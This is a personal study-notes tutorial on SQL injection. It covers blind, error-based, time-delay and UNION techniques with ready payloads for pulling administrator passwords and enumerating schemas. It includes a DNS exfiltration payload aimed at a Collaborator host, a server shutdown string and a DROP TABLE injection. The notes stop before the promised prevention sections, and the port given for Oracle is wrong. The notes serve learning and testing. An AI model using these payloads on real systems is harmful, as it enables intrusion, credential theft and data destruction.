---
title: Meow's CyberAttack - SQL Injection
date: 2020-09-17 11:11:11 -0400
categories: [10CyberAttack, Injection]
tags: [CyberAttack, Injection]
toc: true
image:
---

- [Meow's CyberAttack - SQL Injection](#meows-cyberattack---sql-injection)
  - [Overall](#overall)
  - [SQL injection Type](#sql-injection-type)
    - [Blind SQL injection attacks](#blind-sql-injection-attacks)
      - [Exploiting blind SQL injection by triggering conditional responses](#exploiting-blind-sql-injection-by-triggering-conditional-responses)
      - [Inducing conditional responses by triggering SQL errors](#inducing-conditional-responses-by-triggering-sql-errors)
      - [Exploiting blind SQL injection by triggering time delays](#exploiting-blind-sql-injection-by-triggering-time-delays)
      - [Exploiting blind SQL injection using out-of-band (OAST) techniques](#exploiting-blind-sql-injection-using-out-of-band-oast-techniques)
      - [prevent Blind SQL injection attacks](#prevent-blind-sql-injection-attacks)
  - [launch:](#launch)
  - [SQL Injection Vulnerabilities](#sql-injection-vulnerabilities)
  - [Preparing for an Attack](#preparing-for-an-attack)
  - [Conducting an Attack](#conducting-an-attack)
    - [Lack of Strong Typing](#lack-of-strong-typing)
    - [SQL injection UNION attacks](#sql-injection-union-attacks)
      - [Find number of columns with SQL injection UNION attack](#find-number-of-columns-with-sql-injection-union-attack)
      - [Find columns with a useful data type in an SQL injection UNION attack](#find-columns-with-a-useful-data-type-in-an-sql-injection-union-attack)
      - [retrieve interesting data by SQL injection UNION attack to](#retrieve-interesting-data-by-sql-injection-union-attack-to)
      - [Querying the database type and version](#querying-the-database-type-and-version)
      - [Listing the contents of the database](#listing-the-contents-of-the-database)
      - [Equivalent to information schema on Oracle](#equivalent-to-information-schema-on-oracle)
      - [Retrieving multiple values within a single column](#retrieving-multiple-values-within-a-single-column)
    - [Acquiring Table Column Names](#acquiring-table-column-names)
  - [Automated SQL Injection Tools](#automated-sql-injection-tools)
  - [SQL Injection Prevention and Remediation](#sql-injection-prevention-and-remediation)
    - [Stored Procedures](#stored-procedures)
    - [Extended Stored Procedures](#extended-stored-procedures)
    - [Sewer System Tables](#sewer-system-tables)

---

# Meow's CyberAttack - SQL Injection

---

## Overall

cross-site scripting is not the only place where URL encoding is used.
- Anywhere you want to obscure text, you can URL-encode it.
- makes it harder for users to understand, can't convert the hexadecimal to ASCII.
- attacks can be obscured or made successful through `URL encoding`
  - SQL injection is one of them.

**SQL (Structured Query Language)**:
- the defacto language used for communicating with online / relational databases.
- used to `make programmatic requests of a relational database server`.
  - The server manages the storage, vary from one server type to another,
  - but in order to get to the storage, inserting data or retrievingit, use SQL

**SQL injection / insertion attack**:
- an attack against the database server/database application of a web server
- `acquire sensitive info in the database` or `to execute remote code`.
- `manipulates the database code` to take advantage of a weakness in it.
  - Sends / injects unexpected data through a web request.
  - Sometimes, form data is passed directly into an SQL query from the application server to the database server to execute.
  - the database could be altered or damaged.
  - data could be extracted
  - have authentication bypassed.


The name refers to Microsoft’s SQL database, but it is also applicable to other databases slike Oracle Net Listener, MySQL.
- One version of the attack occurs when the user input stream contains a string literal escape characters and these characters are not properly screened.
- Example:
- the ' character in the username field.
- This input can modify the results of SQL statements conducted on the database and result in manipulation of the database contents and the Web server.
- One reason for this is that error messages displayed by the SQL server from incorrect inputs such as the ' character in the username can provide valuable information, such as password hashes, usernames, and the database name, to an attacker.


database factores:
- Syntax for string concatenation
- comments
- batched/stacked quesries
- platform-specific APIs
- Error messages


---


## SQL injection Type

Traditionally, classify the types of SQL injection in accordance with `order of injection`, `input data type`, `server response` and `data extraction channel`.

The framework of order of injection:
- **first order injection**:
  - the attacker enters a malicious string and commands it to be executed immediately.
  - app take user input from the HTTP request, incorporates the input to an SQL query in an unsafe way.

- **second order injection / stored SQL injection attack**
  - the attacker inputs a malicious string that is rather resistant and stealthy.
  - app take user input from the HTTP request, and stored it (in database...) for future use.
  - This string is executed when a trigger activity is realized.
  - another SQL, database retrieves the stored data and incorporates the input to an SQL query in an unsafe way.
  - example:
    - setup user:
    - name: `badguy'; update users set passwd='123' where user='admin'--`
    - passwd: 123
    - stored in database
    - login:
    - `Select * from usertable where user = 'badguy'; update users set passwd='12345' where user='admin'--'`
    - change passwd for admin

![Screen Shot 2020-11-19 at 02.09.39](https://i.imgur.com/82YEpIO.png)

input data type classification:
- String based injection and integer based injection.
- string based injection differs from an integer based injection in the ability to display the results of the SQLi query.
- In string based injection, it is not possible to see the results of an injection in real time.

use server response as a criterion
- error based SQLi and blind based SQLi.
- In **error based SQLi**, the attacker exploits the error messages created by the data server.
- In **blind based SQLi**, the attacker employs a method that aims to exploit the database through asking true or false questions.

---


### Blind SQL injection attacks

- injection attack on a web server based on `responses to True/False questions`.
- Not all queries will generate output.
- be flying blind because
  - **can't see the results of the query**.
    - `does not display errors with information about the injection results to the attacker`.
  - **need to change your approach**.
    - structure your query so you get either success or failure that you can see because of how the application works.
- The purpose of a blind injection: `see if the page behaves differently based on the input provided`.
    - This may allow you to determine whether a page is vulnerable to SQL injection before you spend a lot of time trying to run these attacks.
    - try to get a false by appending "and 1=2".
      - Since 1 never equals 2, the entire search should return false.
      - see the results from that page
    - run another query that should generate a true. l=l.
      - If you get a different result from the query 1=1 than you did from 1=2,
      - the page may be vulnerable to SQL injection.
    - make this assumption because the response from the app was different when different SQL was submitted.

---

#### Exploiting blind SQL injection by triggering conditional responses

- Consider an application that uses tracking cookies to gather analytics about usage.
  - Requests to the application include a cookie header like this:
    - `Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`
  - When a request containing a TrackingId cookie is processed, the application determines whether this is a known user using an SQL query like this:
    - `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`

  - This query is **vulnerable to SQL injection**
    - the results from the query are not returned to the user.
    - but the application does behave differently depending on whether the query returns any data.
    - If it returns data (because a recognized TrackingId was submitted), then a `"Welcome back"` message is displayed within the page.
    - This behavior is enough to be able to `exploit the blind SQL injection vulnerability and retrieve information`, by triggering different responses conditionally, depending on an injected condition.

  - To see how this works, suppose that two requests are sent containing the following TrackingId cookie values in turn:

    ```sql
    xyz' UNION SELECT 'a' WHERE 1=1--
    xyz' UNION SELECT 'a' WHERE 1=2--
    ```

  - The first of these values will cause the query to return results
    - because the injected or 1=1 condition is true,
    - and so the "Welcome back" message will be displayed.

  - The second value will cause the query to not return any results,
    - because the injected condition is false,
    - and so the "Welcome back" message will not be displayed.

> This allows us to determine the answer to any single injected condition, and so extract data one bit at a time.

Attack Example:
- suppose a table called `Users`
  - columns: `Username` and `Password`
  - a user called `Administrator`.

- We can systematically determine the password for this user by sending a series of inputs to test the password one character at a time.

1. start with the following input:
   - This returns the "Welcome back" message,
   - indicating that the injected condition is true,
   - and so the first character of the password is greater than `m`.

```sql
xyz' UNION SELECT 'a' FROM Users
WHERE Username = 'Administrator'
AND SUBSTRING(Password, 1, 1) > 'm'--
```

2. Next send the following input:
	 - This does not return the "Welcome back" message,
	 - indicating that the injected condition is false,
	 - and so the first character of the password is not greater than `t`.


```sql
xyz' UNION SELECT 'a' FROM Users
WHERE Username = 'Administrator'
AND SUBSTRING(Password, 1, 1) > 't'--
```


3. Eventually, confirming that the first character of the password is s:

```sql
xyz' UNION SELECT 'a' FROM Users
WHERE Username = 'Administrator'
AND SUBSTRING(Password, 1, 1) = 's'--
```

4. continue this process to systematically determine the full password for the Administrator user.

> Note: The `SUBSTRING` function is called `SUBSTR` on some types of database.
For more details, see the SQL injection cheat sheet.


---

#### Inducing conditional responses by triggering SQL errors

suppose instead that the application carries out the same SQL query, but does not behave any differently depending on whether the query returns any data.
- The preceding technique will not work,
- because injecting different Boolean conditions makes no difference to the application's responses.

In this situation, induce the application to return conditional responses by triggering SQL errors conditionally, depending on an injected condition.
- This involves modifying the query so that it will cause a database error if the condition is true, but not if the condition is false.
- Very often, an unhandled error thrown by the database will cause some difference in the application's response (such as an error message), allowing us to infer the truth of the injected condition.

These inputs use the `CASE` keyword to `test a condition` and `return a different expression depending on whether the expression is true`.
- Assuming the error causes some difference in the application's HTTP response, use this difference to infer whether the injected condition is true.


```py
xyz' UNION SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END--
# the case expression evaluates to NULL, does not cause any error.

xyz' UNION SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END--
# it evaluates to 1/0, which causes a divide-by-zero error.


# to retrieve data by systematically testing one character at a time:
xyz' union select case when (username = 'Administrator' and SUBSTRING(password, 1, 1) > 'm') then 1/0 else null end from users--
```

> Note: There are various ways of triggering conditional errors, and different techniques work best on different types of database.


---


#### Exploiting blind SQL injection by triggering time delays

suppose that the application now catches database errors and handles them gracefully.
- Triggering a database error when the injected SQL query is executed no longer causes any difference in the application's response, so the preceding technique of inducing conditional errors will not work.


to exploit the blind SQL injection vulnerability by triggering **time delays conditionally**, depending on an injected condition.
- Because SQL queries are generally processed synchronously by the application,
- delaying the execution of an SQL query will also delay the HTTP response.
- This allows us to infer the truth of the injected condition based on the time taken before the HTTP response is received.


The techniques for triggering a time delay are highly specific to the type of database being used.
- On Microsoft SQL Server, input like the following can be used to test a condition and trigger a delay depending on whether the expression is true:

```py
'; IF (1=2) WAITFOR DELAY '0:0:10'--
# will not trigger a delay, because the condition 1=2 is false

'; IF (1=1) WAITFOR DELAY '0:0:10'--
# will trigger a delay of 10 seconds, because the condition 1=1 is true.
```

retrieve data in the way already described, by systematically testing one character at a time:

`'; IF (SELECT COUNT(username) FROM Users WHERE username = 'Administrator' AND SUBSTRING(password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`

> Note: There are various ways of triggering time delays within SQL queries, and different techniques apply on different types of database

---


#### Exploiting blind SQL injection using out-of-band (OAST) techniques

Now, suppose that the application carries out the same SQL query, but does it asynchronously.
- The application continues processing the user's request in the original thread,
- and uses another thread to execute an SQL query using the tracking cookie.
- The query is still vulnerable to SQL injection,
- however none of the techniques described so far will work:
- the application's response doesn't depend on whether the query returns any data, or on whether a database error occurs, or on the time taken to execute the query.


In this situation, exploit the blind SQL injection vulnerability by triggering **out-of-band network interactions** to a system that you control.
- As previously, these can be triggered conditionally, depending on an injected condition, to infer information one bit at a time.
- But more powerfully, data can be exfiltrated directly within the network interaction itself.

A variety of network protocols can be used for this purpose,
- typically the most effective is DNS (domain name service), because very many production networks allow free egress of DNS queries, because they are essential for the normal operation of production systems.


The easiest and most reliable way to use out-of-band techniques is using **Burp Collaborator**.
- This is a server that provides custom implementations of various network services (including DNS), and allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application.
- Support for Burp Collaborator is built in to Burp Suite Pro


The techniques for triggering a DNS query are highly specific to the type of database being used.
- On Microsoft SQL Server,
  - `'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`
  - to cause a DNS lookup on a specified domain
  - cause the database to perform a lookup for the following domain:
  - `0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`

You can use Burp Suite's Collaborator client to generate a unique subdomain and poll the Collaborator server to confirm when any DNS lookups occur.


Having confirmed a way to trigger out-of-band interactions, then use the out-of-band channel to exfiltrate data from the vulnerable application. For example:

`'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`

- This input reads the password for the Administrator user,
- appends a unique Collaborator subdomain,
- and triggers a DNS lookup.
- This will result in a DNS lookup like the following, allowing you to view the captured password:

`S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net`

**Out-of-band (OAST) techniques** are an extremely powerful way to detect and exploit blind SQL injection, due to the highly likelihood of success and the ability to directly exfiltrate data within the out-of-band channel. For this reason, OAST techniques are often preferable even in situations where other techniques for blind exploitation do work.


---


#### prevent Blind SQL injection attacks

- Although the techniques needed to find and exploit blind SQL injection vulnerabilities are different and more sophisticated than for regular SQL injection, the measures needed to prevent SQL injection are the same regardless of whether the vulnerability is blind or not.

- As with regular SQL injection, blind SQL injection attacks can be prevented through the careful use of `parameterized queries`, which ensure that user input cannot interfere with the structure of the intended SQL query.

---


## launch:
target Applications to attack with SQL injection must already have SQL in place
- to run a query necessary for the application to succeed.
- Example:
- search on the site for "jodie whitta ker doll”, get the right results back.
  - Behind the scenes, the application may have an SQL statement that reads
  - `SELECT * FROM inventory_table WHERE description == '$searchstr'` ;

-  need to find a way to get your query to work in the context of the existing one.
  - Damn Vulnerable Web App
  - a deliberately vulnerable web application
  - used to learn, try against different levels of security in the application.
  - The string entered: ' or 'a' = ' a.     User ID: ‘  ' or 'a' = ' a ’
  - uses the single quote to close out the existing query string and then introduces the Boolean logicterm or along with a test that will return a true.
  - This means the overall expression will return true.
  - Every row in the database will evaluate to true. Since the query here likely starts with `SELECT *`, we get every row in the database back.

the query inserted leaves the last quote out, the query in the application already has a single quote at the end.
- may not always work, depending on the SQL query in place in the app
- In some cases, you may need to replace the rest of the query in the application. This can be done using comment characters.
- SQL server based on MySQL, MariaDB: use the double dash `--` to indicate a comment.
  - Everything after your double dash is commented out.
  - allow you to inject your own complete SQL statement and then just comment out everything else in the application.
  - MySQL syntax also allows the use of the `#` to indicate a comment. like the double dash.
- In Oracle / Microsoft SQL Server, the double dash also works.
  - semicolon (`;`) to indicate the end of the SQL line,
  - two dashes (`--`) as an ignored comment.
- Various types of exploits use SQL injection, common categories:
  - Escape characters not filtered correctly
  - Type handling not properly done
  - Conditional errors
  - Time delays


SQL doesn't always work the same, to determine the underlying database server.
1. based on the `reconnaissance` did earlier.
   - example,
   - a poorly configured Apache server may tell you what modules are loaded.
2. based on the `results of an application version scan` that there is a MySQL server.
   - If you are doing against a Microsoft IIS installation, you could guess it may be Microsoft SQL Server.
3. `introduce invalid SQL into the application`.
   - If the application is well programmed, should not get anything back
   - error message could includes the database server or the server type because of the wording of the error.
   - If the application doesn’t include error-handling routines, these errors provide details about the type of database the application is using,
     - such as an Oracle, Microsoft SQL Server, or MySQL database.
   - Different databases format SQL statements slightly differently, but learns the database brand, it’s a simple matter to format the SQL statements required by that brand.
   - The attacker then follows with SQL statements to access the database and may allow the attacker to read, modify, delete, and/or corrupt data.



- Communicate with a database, have a SQL statements executed when someone clicks a logon button.
  - SQL statements take the username and password entered, and query the database to see if they are correct.
- Problem begins with the way websites are written.
  - written in some scripting, markup, or programming language, like HTML (Hypertext Markup Language), PHP (PHP: Hypertext Preprocessor), ASP (Active Server Pages)…
  - These languages don’t understand SQL,
  - the SQL statements are usually put into a string.

---


## SQL Injection Vulnerabilities

**Databases** supporting web servers and applications
- attractive targets for hackers.
- The information contained in these databases can be sensitive and critical to an organization.
- The most popular database systems
  - Microsoft SQL, ports 1433
  - MySQL, ports 3306
  - and Oracle Net Listener, ports 159

A popular and effective attack against database applications on web servers: SQL injection.
- This type of attack takes advantage of SQL server vulnerabilities, such as lack of proper input string checking and failure to install critical patches in a timely fashion.


SQL Injection Testing and Attacks
- An SQL injection attack exploits vulnerabilities in a web server database
- These vulnerabilities arise because:
  - the database `does not filter escape characters `
  - the database `does not use strong typing`, which prohibits input statements from being interpreted as instructions.
- allow the attacker to
  - gain access to the database
  - read, modify, or delete information.
  - even gain system privileges for the computer itself with some SQL injection exploits.
  - database footprinting
    - identifies the database tables and forms the basis for other attacks.


to detect SQL injection vulnerabilities
- SQL injection can be detected manually by using a systematic set of tests against every entry point in the application. This typically involves:
  - Submitting the `single quote character '` and looking for errors or other anomalies.
  - Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses.
  - Submitting Boolean conditions such as `OR 1=1` and `OR 1=2`, and looking for differences in the application's responses.
  - Submitting payloads designed to trigger time delays when executed within an SQL query, and looking for differences in the time taken to respond.
  - submitting OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query, and monitoring for any resulting interactions.

---

## Preparing for an Attack
To conduct an SQL injection, a hacker initially test a database to determine if it is susceptible to such an attack.
- place a `single quote character ' `, into the query string of a URL.
  - Desired response: an **Open DataBase Connectivity (ODBC) error message**
  - ODBC:
    - indicates a vulnerability to an SQL injection attack.
    - a standard database access process that provides the ability to access data from any application, independent of the **database management system (DBMS)** being used.
    - This “universality” is made possible by a database driver layer that `translates the database data queries into commands` that are recognized by the particular DBMS involved.
  - the return of an error message indicates that injection will work.
  - It is important to search the returned page for words such as ODBC or syntax.

> A typical **ODBC error message** is:
> Microsoft OLE DB Provider for ODBC Drivers error '80040el4'
> [Microsoft] [ODBC SQL Server Driver] [SQL Server]Incorrect syntax near the keyword 'and' .
> /wasc.asp, line 68


- If the website is supported by a backend database that incorporates scripting languages, like CGI or asp and dynamic data entry, the site is likely to be amenable to SQL injection exploits.
  - Therefore, testing for vulnerabilities is enhanced if Web pages at a URL request input: logins, passwords, or search boxes.
  - Also, the `HTML source code` might contain FORM tags that support sending using a `POST` command to pass parameters to other asp pages.
  - The code between the FORM tags is susceptible to SQL injection testing, such as entering the `'` character.

> A sample of such HTML source code is:
> <FORM action=Search/search.asp method=post>
> <input: type=hidden name=C value=D>
> </FORM>

- Use a direct injection:
  - using an SQL statement and adding a space and the word OR to the parameter value in the query.
  - If an error message is generated, the database is vulnerable to an SQL injection attack.

- quoted injection test:
  - where a parameter in the argument of an SQL statement is modified by preﬁxing and appending it with quotes.

- Another testing option, use automated vulnerability scanning tools:
  - WebInspect and Acunetix.


---

## Conducting an Attack

1. put a SQL statement in the fields that is always true
2. comments out the second single quote to prevent a SQL error.



`1=1`
- `SELECT * FROM tblUSERS WHERE UserName ='' AND Password = ''`
  - `SELECT * FROM tblUSERS WHERE UserName ='admin' AND Password = 'password''`;
  - attacker will **put a SQL statement in the fields that is always true**,
    - like: `' or '1' ='1`
  - `SELECT * FROM tblUSERS WHERE UserName ='' or '1' ='1' AND Password = '' or '1' ='1''`


- Input: Darril Gibson
  - `SELECT * FROM Books WHERE Author='Darril Gibson'`
  - Acctack input: `Darril Gibson'; SELECT * FROM Customers; --`
  - `SELECT * FROM Books WHERE Author='Darril Gibson'; SELECT * FROM Customers;` --'
    - reads all the data in the Customers table: names, credit card data, and more.
    - SQL Server ignores everything after a `--`
    - comments out the second single quote to prevent a SQL error.
    - The `; character`: denotes the end of an SQL query statement


`' or username is not null or username= '`
- `SELECT Username FROM Users WHERE Username = '';`
- `SELECT Username FROM Users WHERE Username= '' or Username is not null or Username= '';`


`; shutdown with nowait;--`
- SQL server provides another command that can be used in SQL injection:
- This command will terminate the server operation and implement an attack with the following responses:
  - Username: `; shutdown with nowait; --`
  - Password: `[Leave blank]`
- If the SQL server is vulnerable, the following statement will be executed:
  - `SELECT Username FROM Users Where username= ‘ ; shutdown with nowait; -- ’ and user_Pass=' '`


---

### Lack of Strong Typing

Another form of SQL injection takes advantage of the SQL developer not having incorporated strong typing into program.

when program is expecting a variable of one type or different type is entered, an SQL injection attack can be effected.

Example: the variable Employeenum is expected to be a number.
- `SELECT Employeename FROM Emptable WHERE Employeenum = '';`

If a character string is inserted instead, the database could be manipulated.
- Setting the Employeenum variable: `l; DROP TABLE Emptable`
- `SELECT Employeename FROM Emptable WHERE Employeenum = l; DROP TABLE Emptable;`
- This SQL statement will erase the table Emptable from the database.


---


### SQL injection UNION attacks
provide database records other than those specified in a valid SQL statement
- will return data from multiple tables in the database with one query.
- Example:
  - `SELECT Broker FROM BrokerList WHERE 1 = 1 UNION ALL SELECT Broker FROM BanksList WHERE 1 = 1;`
  - This UNION statement will provide the broker names in list of brokers in the ﬁrst query and the records from the table containing the name of banks providing brokerage services from the UNION statement.
  - `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`


For a `UNION` query to work, two key requirements must be met:

*   The individual queries must return the same number of columns.
*   The data types in each column must be compatible between the individual queries.

To carry out an SQL injection UNION attack, you need to ensure that your attack meets these two requirements. This generally involves figuring out:

*   How many columns are being returned from the original query?
*   Which columns returned from the original query are of a suitable data type to hold the results from the injected query?


---

#### Find number of columns with SQL injection UNION attack

When performing an SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.


The first method
- injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs.
- For example, assuming the injection point is a quoted string within the `WHERE` clause of the original query, you would submit:

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.

https://abc.net/filter?category=Lifestyle
https://abc.net/filter?category=Lifestyle' ORDER BY 3--
```

- This series of payloads modifies the original query to order the results by different columns in the result set.
  - The column in an `ORDER BY` clause can be specified by its index, so you don't need to know the names of any columns.
  - When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:
  - `The ORDER BY position number 3 is out of range of the number of items in the select list.`
- The application might actually return the database error in its HTTP response, or it might return a generic error, or simply return no results.
- Provided you can detect some difference in the application's response, you can infer how many columns are being returned from the query.



The second method
- submitting a series of `UNION SELECT` payloads specifying a different number of null values:

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.

GET /filter?category=Corporate+gifts'+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1
```


- If the number of nulls does not match the number of columns, the database returns an error, such as:
- `All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`


the application might return this error message, or return a generic error or no results.
- When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column.
- The effect on the resulting HTTP response depends on the application's code.
- If you are lucky, you will see some additional content within the response, such as an extra row on an HTML table.
- Otherwise, the null values might trigger a different error, such as a `NullPointerException`.
- Worst case, the response might be indistinguishable from that which is caused by an incorrect number of nulls, making this method of determining the column count ineffective.


> Note:
> * The reason for using `NULL` as the values returned from the injected `SELECT` query
> * the data types in each column must be compatible between the original and the injected queries.
> * Since `NULL` is convertible to every commonly used data type, using `NULL` maximizes the chance that the payload will succeed when the column count is correct.
> *
> * On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table.
> * There is a built-in table on Oracle called `DUAL` which can be used for this purpose.
> * So the injected queries on Oracle would need to look like: `' UNION SELECT NULL FROM DUAL--`.
> * The payloads described use the double-dash comment sequence `--` to comment out the remainder of the original query following the injection point.
> *
> On MySQL, the double-dash sequence must be followed by a space.
> * Alternatively, the hash character `#` can be used to identify a comment.

---

#### Find columns with a useful data type in an SQL injection UNION attack

The reason for performing an `SQL injection UNION attack` is to be able to retrieve the results from an injected query.
- Generally, the interesting data that you want to retrieve will be in string form, so you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.
- Having already determined the number of required columns
- now probe each column to test whether it can hold string data
  - by submitting a series of `UNION SELECT` payloads
  - that place a string value into each column in turn.

For example, if the query returns four columns, you would submit:

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

- If the data type of a column is not compatible with string data, the injected query will cause a database error, such as:
  - `Conversion failed when converting the varchar value 'a' to data type int.`

- If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.


---

#### retrieve interesting data by SQL injection UNION attack to

1. after determined the number of columns returned by the original query
2. found which columns can hold string data,
3. you are in a position to retrieve interesting data.

Suppose that:
* The original query returns two columns, both of which can hold string data.
* The injection point is a quoted string within the `WHERE` clause.
* The database contains a table called `users` with the columns `username` and `password`.

- to retrieve the contents of the `users` table by submitting the input:
  - `' UNION SELECT username, password FROM users--`

- the crucial information needed to perform this attack is that there is a table called `users` with two columns called `username` and `password`.

---

#### Querying the database type and version

Different databases provide different ways of querying their version. You often need to try out different queries to find one that works, allowing you to determine both the type and version of the database software.

The queries to determine the database version for some popular database types are as follows:

```
| Database type    | Query                   |
| ---------------- | ----------------------- |
| Microsoft, MySQL | SELECT @@version        |
| Oracle           | SELECT * FROM v$version |
| PostgreSQL       | SELECT version()        |
```

---

#### Listing the contents of the database

- query `information_schema.tables` to list the tables in the database:

`SELECT * FROM information_schema.tables`

This returns output like the following:

```
| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE |
| ------------- | ------------ | ---------- | ---------- |
| MyDatabase    | dbo          | Products   | BASE TABLE |
| MyDatabase    | dbo          | Users      | BASE TABLE |
| MyDatabase    | dbo          | Feedback   | BASE TABLE |
```

- query `information_schema.columns` to list the columns in individual tables:

`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`

This returns output like the following:
```
| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | TABLE_TYPE |
| ------------- | ------------ | ---------- | ----------- | ---------- |
| MyDatabase    | dbo          | Users      | UserId      | int        |
| MyDatabase    | dbo          | Users      | Username    | varchar    |
| MyDatabase    | dbo          | Users      | Password    | varchar    |
```

---

#### Equivalent to information schema on Oracle
- list tables by querying all_tables:
  - `SELECT * FROM all_tables`

- list columns by querying all_tab_columns:
  - `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`


---

#### Retrieving multiple values within a single column

- instead that the query only returns a single column.
- can easily retrieve multiple values together within this single column by concatenating the values together,
- ideally including a suitable separator to let you distinguish the combined values.
- For example
  - on Oracle you could submit the input:
  - `' UNION SELECT username || '~' || password FROM users--`
  - the double-pipe sequence `||`: a string concatenation operator on Oracle.
  - The injected query concatenates together the values of the `username` and `password` fields, separated by the `~` character.

The results from the query will let you read all of the usernames and passwords, for example:

```bash
...
administrator~s3cure
wiener~peter
carlos~montoya
...
```



---

The use of a LIKE clause, another method of SQL injection
- Example:
- inserting wildcard characters (like %),
  - Then, the WHERE clause = TRUE when the argument strPartName is included as part of a part name:
  - Then, all parts names include the string `abc` will be returned.
  - `SELECT PartCost, PartName FROM PartsList WHERE PartName LIKE '%abc%';`
- employ the wildcard symbol to guess the admin username:
  - querying with `ad%`.

---

incorporating the UNION and LIKE statements is to use the **ODBC error message** to gather information from the database.

Example 1:
- the page `https://page/index.asp?id=20`.
- use the UNION statement to set up a query as follows:
  - `https://page/index.asp?id=20 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES --`
    - `<kbd>Information_Schema Tables</kbd>`: hold data on all the tables in the server database
    - `<kbd>Table Name</kbd> field`: holds name of each table in the database.

- This string attempts to UNION the integer 20 with another string from the database.
  - `SELECT`: provide the name of the ﬁrst table in the database
  - `UNION`: result in the SQL server attempting to convert a character string to integer.

- This conversion will fail, error message will be return and provides the information:
  - the string could not be converted to an integer
  - provides the name of the first table in the database, namely employeetable.

> Microsoft OLE DB Provider for ODBC Drivers error '80040e07‘
> [Microsoft] [ODBC SQL Server Driver] [SQL Server]Syntax error converting the nvarchar value 'employeetable' to a column of data type int.
> /index.asp, line 6

- Then using the following statement,
  - `https://page/index.asp?id=20 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME not IN ('employeetable') --`
  - the name of the next table in the database tables will be returned



Example 2:
- use the LIKE keyword in the following statement, additional information can be found:
  - `https://page/index.asp?id=20 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%25 login%25'--`
  - The term `'%25login%25'`: will be interpreted as `%login%` by the server.
  - The resulting **ODBC error message** would be:
    - The ODBC error message identifies a table name as `sys_login`.

> Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
> [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'sys_login' to a column of data type int.
> /index.asp, line 6

- The next step, obtain a `login_name` from the `sys_login table`:
  - `https://page/index.asp?id=20 UNION SELECT TOP 1 login_name FROM sys_login --`
  - The resulting **ODBC error message**:
    - provides the login name `whiteknight` from the `sys_login` table

> Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
> [Microsoft][ODBC SQL Server Driver][SQL ServerJSyntax error converting the nvarchar value 'whiteknight’ to a column of data type int.
> /index.asp, line 6


- To obtain the password for whiteknight:
  - `https://page/index.asp?id=20 UNION SELECT TOP 1 password FROM sys_login where login_name='whiteknight' --`
  - The corresponding **ODBC error message**: gives the password for whiteknight is revealed: `rlkfoo3`.

> Microsoft OLE DB Provider for ODBC Drivers error ‘80040907'
> [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'rlkfooB' to a column of data type int.
> /index.asp, line 6

---


### Acquiring Table Column Names

Once table identified, obtaining the column names provides valuable information concerning the table and its contents.

Examples:
- acquire column names by accessing the database table `INFORMATION_SCHEMA.COLUMNS`.
- The injection attack begins with the URL:
  - `https://page/index.asp?id=20 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME= 'parts' --`
  - The corresponding **ODBC error message**: gives the first column name in `Parts` table as `partnum`

> Microsoft OLE DB Provider for ODBC Drivers error '80040e07‘
> [Microsoft] [ODBC SQL Server Driver] [SQL ServerJSyntax error converting the nvarchar value 'partnum' to a column of data type int.
> /index.asp, line 6

- To obtain, the second column name, the expression `not IN ()` can be applied as shown:
  - `https://page/index.asp?id=20 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME= 'parts' WHERE COLUMN_NAME not IN ('partnum') --`
  - The corresponding **ODBC error message**: provides the next column name as `partcost`.

> Microsoft OLE DB Provider for ODBC Drivers error '80040907‘
> [Microsoft] [ODBC SQL Server Driver] [SQL ServerJSyntax error converting the nvarchar value 'partcost‘ to a column of data type int.
> /index.asp, line 6

In this manner, all the remaining columns in the table can be found.


---


## Automated SQL Injection Tools

A series of automated tools for finding SQL injection vulnerabilities and SQL injection attacks.


popular SQL injection tools：

**Absinthe**
- an automated tool
- to implement SQL injections and retrieve data from a web server database.
